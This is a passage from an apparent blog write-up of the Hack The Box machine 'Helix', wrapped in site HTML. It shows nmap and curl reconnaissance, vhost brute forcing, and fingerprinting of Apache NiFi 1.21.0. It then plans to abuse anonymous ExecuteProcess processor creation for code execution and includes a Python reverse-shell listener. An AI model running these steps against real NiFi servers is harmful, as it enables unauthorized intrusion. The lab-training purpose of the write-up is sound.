@@ -1,0 +1,889 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/08/08/hackthebox-helix/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewHelix is a Linux machine from Hack The Box built around an ICS&#x2F;OPC-UA scenario with the following chain: recon two open ports (22, 80) -&gt; follow the redirect to helix.htb -&gt; vhost b">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Helix">
+<meta property="og:url" content="http://fouedsaidi.com/2026/08/08/Hackthebox-Helix/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewHelix is a Linux machine from Hack The Box built around an ICS&#x2F;OPC-UA scenario with the following chain: recon two open ports (22, 80) -&gt; follow the redirect to helix.htb -&gt; vhost b">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Helix/Helix.png">
+<meta property="article:published_time" content="2026-08-08T11:20:00.000Z">
+<meta property="article:modified_time" content="2026-08-08T06:00:03.984Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Helix/Helix.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Helix -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Helix</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-08-08 14:20</span>
+        <span class="mobile">2026-08-08 14:20</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-08-08 09:03</span>
+            <span class="mobile">2026-08-08 09:03</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Helix is a Linux machine from Hack The Box built around an ICS&#x2F;OPC-UA scenario with the following chain: recon two open ports (22, 80) -&gt; follow the redirect to <code>helix.htb</code> -&gt; vhost brute forcing reveals <code>flow.helix.htb</code> running Apache NiFi 1.21.0 -&gt; abuse anonymous write on the root process-group to drop an <code>ExecuteProcess</code> processor -&gt; reverse shell as the <code>nifi</code> service account -&gt; loot a leftover SSH key from the NiFi support-bundles directory -&gt; SSH in as <code>operator</code> and grab the user flag -&gt; discover a NOPASSWD sudo entry on <code>helix-maint-console</code> plus a password-protected safety guide PDF -&gt; crack the PDF with john and learn the reactor’s “maintenance operating window” mechanic -&gt; talk to the loopback-only OPC-UA server with <code>asyncua</code>, ramp <code>CalibrationOffset</code> to force temperature above the maintenance threshold, and hold it hot in a background task while calling the sudo helper in the same process -&gt; root.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Helix/Helix.png"
+                      alt="Helix-info-card"
+                ><figcaption>Helix-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>We start with a full-port TCP scan to see what the box exposes:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate 5000 -T4 10.129.28.235 -oN nmap-fast.txt</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.91 seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>Only two ports, so we run a service&#x2F;version scan against them:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -p 22,80 10.129.28.235 -oN nmap-sv.txt</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://helix.htb/</span><br></pre></td></tr></table></figure></div>
+
+<p>The redirect on port 80 already hands us the canonical hostname:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sI http://10.129.28.235/</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Location: http://helix.htb/</span><br></pre></td></tr></table></figure></div>
+
+<p>We add <code>helix.htb</code> to our <code>/etc/hosts</code> and take a quick look at what’s being served:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.129.28.235 helix.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br><span class="line">curl -s http://helix.htb/ | grep -iE <span class="string">&#x27;title|&lt;h1|product|powered|generator&#x27;</span> | <span class="built_in">head</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Helix Integration Platform&lt;/title&gt;</span><br><span class="line">&lt;h1 class=&quot;text-3xl font-extrabold&quot;&gt;Helix Integration Platform&lt;/h1&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>This is just a marketing landing page — there’s nothing to attack here. The real application is almost certainly on a sibling vhost.</p>
+<h2 id="Vhost-brute-forcing"><a href="#Vhost-brute-forcing" class="headerlink" title="Vhost brute forcing"></a>Vhost brute forcing</h2><p>A non-existent host on <code>helix.htb</code> returns a <code>301</code> with a <code>178</code>-byte body, so anything that <em>isn’t</em> <code>301</code>&#x2F;<code>178</code> is a real backend. We spray a short list of likely subdomains via the <code>Host</code> header:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; subs.txt &lt;&lt;<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">api admin dev <span class="built_in">test</span> staging app flow flows nifi</span><br><span class="line">data automation integration auth sso git portal</span><br><span class="line">www mail backend</span><br><span class="line">EOF</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> $(<span class="built_in">cat</span> subs.txt); <span class="keyword">do</span></span><br><span class="line">    out=$(curl -s -H <span class="string">&quot;Host: <span class="variable">$&#123;s&#125;</span>.helix.htb&quot;</span> http://10.129.28.235/ \</span><br><span class="line">        -o /dev/null -w <span class="string">&quot;%&#123;http_code&#125; %&#123;size_download&#125;&quot;</span>)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;s&#125;</span>.helix.htb -&gt; <span class="variable">$&#123;out&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">api.helix.htb        -&gt; 301 178</span><br><span class="line">admin.helix.htb      -&gt; 301 178</span><br><span class="line">dev.helix.htb        -&gt; 301 178</span><br><span class="line">test.helix.htb       -&gt; 301 178</span><br><span class="line">staging.helix.htb    -&gt; 301 178</span><br><span class="line">app.helix.htb        -&gt; 301 178</span><br><span class="line">flow.helix.htb       -&gt; 200 1683       ← only outlier</span><br><span class="line">flows.helix.htb      -&gt; 301 178</span><br><span class="line">nifi.helix.htb       -&gt; 301 178</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
+<p><code>flow.helix.htb</code> is the only outlier. We add it to <code>/etc/hosts</code> and confirm it responds:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.129.28.235 flow.helix.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br><span class="line">curl -sI http://flow.helix.htb/</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Content-Type: text/html</span><br></pre></td></tr></table></figure></div>
+
+<p>Checking the title and the <code>/nifi/</code> path tells us exactly what this is:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://flow.helix.htb/ | grep -iE <span class="string">&#x27;title|generator&#x27;</span> | <span class="built_in">head</span></span><br><span class="line">curl -sI http://flow.helix.htb/nifi/</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;NiFi&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Location: http://flow.helix.htb/nifi/</span><br></pre></td></tr></table></figure></div>
+
+<p>It’s Apache NiFi. We pin the version through its unauthenticated <code>about</code> endpoint:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://flow.helix.htb/nifi-api/flow/about</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;about&quot;: &#123;</span><br><span class="line">    &quot;title&quot;: &quot;NiFi&quot;,</span><br><span class="line">    &quot;version&quot;: &quot;1.21.0&quot;,</span><br><span class="line">    &quot;uri&quot;: &quot;http://flow.helix.htb/nifi-api/flow/about&quot;,</span><br><span class="line">    &quot;buildTag&quot;: &quot;nifi-1.21.0-RC2&quot;,</span><br><span class="line">    &quot;buildTimestamp&quot;: &quot;04/03/2023 11:48:21 UTC&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>Apache NiFi 1.21.0</strong> has two well-known unauthenticated paths to RCE:</p>
+<ul>
+<li><strong>CVE-2023-34468</strong> — H2&#x2F;JDBC RCE through the <code>DBCPConnectionPool</code> controller service.</li>
+<li><strong>Anonymous abuse of the <code>ExecuteProcess</code> processor</strong> — if anonymous users can create processors in the root process-group (which is the default on a stock 1.x install), they can spawn arbitrary shell commands.</li>
+</ul>
+<p>The <code>ExecuteProcess</code> path is shorter — no controller-service plumbing — so we’ll take that one.</p>
+<h2 id="Foothold-—-Apache-NiFi-RCE-→-shell-as-nifi"><a href="#Foothold-—-Apache-NiFi-RCE-→-shell-as-nifi" class="headerlink" title="Foothold — Apache NiFi RCE → shell as nifi"></a>Foothold — Apache NiFi RCE → shell as <code>nifi</code></h2><h3 id="Confirm-anonymous-write-on-the-root-process-group"><a href="#Confirm-anonymous-write-on-the-root-process-group" class="headerlink" title="Confirm anonymous write on the root process-group"></a>Confirm anonymous write on the root process-group</h3><p>First we grab the root process-group id, which we’ll need for every subsequent API call:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://flow.helix.htb/nifi-api/process-groups/root&quot;</span> \</span><br><span class="line">    | python3 -c <span class="string">&#x27;import sys,json; print(json.load(sys.stdin)[&quot;id&quot;])&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f203bc07-019b-1000-516b-eaedd48609d1</span><br></pre></td></tr></table></figure></div>
+
+<p>The endpoint returns the root PG id without an auth challenge — anonymous reads are on, and on this build anonymous writes are too (the default <code>users.xml</code> policy).</p>
+<h3 id="Stand-up-a-multi-command-reverse-shell-listener"><a href="#Stand-up-a-multi-command-reverse-shell-listener" class="headerlink" title="Stand up a multi-command reverse-shell listener"></a>Stand up a multi-command reverse-shell listener</h3><p>Plain <code>nc</code> works once but loses history and arrow keys. This little Python listener accepts the callback, exposes a FIFO for input and a logfile for output, so we can pipe commands into the shell without re-exploiting between each one:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /tmp/helix/runner.py</span></span><br><span class="line"><span class="keyword">import</span> socket, threading, os, sys, time</span><br><span class="line">LISTEN, CMDFIFO, LOG = (<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">9001</span>), <span class="string">&quot;/tmp/helix/cmd.fifo&quot;</span>, <span class="string">&quot;/tmp/helix/shell.log&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(CMDFIFO): os.mkfifo(CMDFIFO)</span><br><span class="line"><span class="built_in">open</span>(LOG, <span class="string">&quot;w&quot;</span>).close()</span><br><span class="line">srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">srv.bind(LISTEN); srv.listen(<span class="number">1</span>)</span><br><span class="line">conn, _ = srv.accept()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(LOG, <span class="string">&quot;ab&quot;</span>, buffering=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = conn.recv(<span class="number">65536</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> d: <span class="keyword">break</span></span><br><span class="line">        f.write(d); sys.stdout.buffer.write(d); sys.stdout.flush()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">w</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(CMDFIFO) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f: conn.sendall(line.encode())</span><br><span class="line">threading.Thread(target=r, daemon=<span class="literal">True</span>).start()</span><br><span class="line">threading.Thread(target=w, daemon=<span class="literal">True</span>).start()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>: time.sleep(<span class="number">60</span>)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /tmp/helix</span><br><span class="line"><span class="built_in">nohup</span> python3 /tmp/helix/runner.py &gt;/tmp/helix/runner.out 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></div>
+
